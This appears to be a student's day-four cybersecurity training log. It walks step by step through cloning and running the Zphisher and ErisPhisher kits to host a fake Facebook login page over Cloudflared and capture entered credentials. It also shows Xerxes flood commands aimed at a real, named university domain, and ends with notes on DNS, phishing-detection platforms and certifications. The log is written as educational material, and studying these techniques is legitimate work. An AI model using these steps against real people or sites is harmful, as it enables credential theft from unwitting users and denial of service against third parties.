# 🔖 Day 4: Phishing Attacks using Zphisher & ErisPhisher

*📅 Date:* June 21, 2025

---

### 🧠 Topics Covered:

* Phishing attack automation with *Zphisher* and *ErisPhisher*
* Cloning phishing tool repositories from GitHub
* Setting up fake login pages for social media platforms
* Simulating credential theft and capturing results
* Port forwarding using Cloudflared
* DNS theory and DNS Flood attack using Xerxes
* Threat analysis tools and platforms
* Intro to certifications: *CEH* and *OSCP*

---

### 💻 What I Did:

On Day 4, I explored how to carry out realistic phishing simulations using *Zphisher* and *ErisPhisher. I also studied DNS concepts and executed a DNS flooding attack using the tool **Xerxes*. Additionally, I explored various platforms used to detect and investigate phishing websites. Finally, I researched some popular cybersecurity certifications.


## 🧰 Tools Used to create Fake Login page

* 🔗 **Zphisher**: [https://github.com/htr-tech/zphisher.git](https://github.com/htr-tech/zphisher.git)
* 🔗 **ErisPhisher**: [https://github.com/tanv1r-0x/ErisPhisher](https://github.com/tanv1r-0x/ErisPhisher)

## ⚙️ Steps Followed

### 📥 1. Cloning the Repositories

```bash
git clone https://github.com/htr-tech/zphisher.git
git clone https://github.com/tanv1r-0x/ErisPhisher
```

### 📁 2. Navigating to Directory

```bash
cd zphisher
# or for ErisPhisher
cd ErisPhisher
```

### 🔐 3. Gaining Root Access (Optional)

```bash
sudo su
```

### 🧾 4. Giving Execution Permission and Running the Script

```bash
chmod +x zphisher.sh
./zphisher.sh
```

### 🎯 5. Selecting Target Platform

When the tool starts, it shows a list of platforms to create fake login pages:

```
[01] Facebook
[02] Instagram
[03] Google
...
```

✅ Choose:

```
1 for Facebook
```

### 🖼️ 6. Selecting Login Page Style

```
[01] Traditional Login Page
[02] Advanced Voting Poll Login Page
[03] Fake Security Login Page
[04] Facebook Messenger Login Page
```

✅ Choose:

```
1 for Traditional Login Page
```

### 🌐 7. Choosing Port Forwarding Method

```
[01] Localhost
[02] Cloudflared  [Auto Detects]
[03] LocalXpose   [NEW! Max Min]
```

✅ Choose:

```
02 for Cloudflared
```

### ❓ 8. Additional Prompts

* ⚙️ **Custom Port?** → `n`
* ⚙️ **Mask URL?** → `n`

### 🔗 9. Final Output

📌 The tool will generate a phishing URL.

* Copy the link and open it in a browser.
* Any credentials entered will appear in the attacker's terminal.

---

> ⚠️ **Disclaimer**: This documentation is part of cybersecurity training for educational purposes only. Performing phishing attacks on individuals or systems without explicit permission is illegal and unethical.

---

### 🌐 What is DNS?

*DNS (Domain Name System)* is like the phonebook of the internet. When you type a website like google.com into your browser, DNS translates that human-readable name into an IP address (e.g., 142.250.77.238) so your computer can load the website.

* It maps domain names to IP addresses
* Without DNS, we would have to remember IP addresses of websites
* It uses a hierarchical structure with root, top-level domains (.com, .org), and domain levels

---

### 🚨 DNS Attack using Xerxes:

In this task, I simulated a *DNS Flood attack* using a tool named *Xerxes*. The attack overwhelms the server with requests, potentially making it unreachable.

#### ⚙ Steps Performed:

1. *Cloned Xerxes tool*:

bash
git clone https://github.com/jaspreet-infosec/XERXES


2. *Navigated to the folder and switched to root*:

bash
cd XERXES
sudo su
ls


3. *Compiled and ran the attack*:

bash
./xerxes website-name port
# Example:
./xerxes gndec.ac.in 80


➡ This initiates a DNS Flood attack on the target, overwhelming its resources and possibly causing denial of service.

---

### 🔍 Threat Analysis & Phishing Detection Platforms:

| Tool                     | Description                                                              |
| ------------------------ | ------------------------------------------------------------------------ |
| *VirusTotal*           | Scans URLs/files with 70+ antivirus engines to detect threats            |
| *urlscan.io*           | Shows website behavior, hidden redirects, embedded scripts, etc.         |
| *webcheck*             | Provides URL analysis and basic risk scoring                             |
| *HaveIBeenPwned*       | Checks if your email/data has been breached in known data leaks          |
| *Censys.io*            | Search engine for internet-connected assets and services                 |
| *Whois Lookup*         | Shows domain registration details                                        |
| *Metasploitable*       | A deliberately vulnerable Linux VM used for penetration testing practice |
| *Tenable Nessus*       | Vulnerability scanner to assess systems for weaknesses                   |
| *Bug Bounty Platforms* | Sites like HackerOne, Bugcrowd where researchers report security bugs    |

---

### 🎓 Cybersecurity Certifications:

* *CEH (Certified Ethical Hacker)*:

  * Offered by EC-Council
  * Covers tools and techniques used by hackers and ethical hackers
  * Good for beginners in ethical hacking

* *OSCP (Offensive Security Certified Professional)*:

  * Hands-on, performance-based exam
  * Offered by Offensive Security
  * Requires strong practical penetration testing skills
  * Highly respected in the cybersecurity field

---

### 🧠 Key Learnings:

* Phishing tools automate complex attacks, and simulations help us understand the risks
* DNS attacks can take down websites through overload
* Many free tools exist to analyze, detect, and prevent phishing and security issues
* CEH and OSCP are valuable certifications for aspiring ethical hackers

---

### 🛠 Tools Used:

* *Zphisher, ErisPhisher*
* *Xerxes (DNS attack)*
* *VirusTotal, urlscan.io, HaveIBeenPwned, Censys.io, Whois*
* *Metasploitable, Tenable Nessus*
* *Web browsers, Kali Linux Terminal*

---

[⬅ Back to Day 3](Day3.md) | [➡ Go to Day 5](Day5.md)
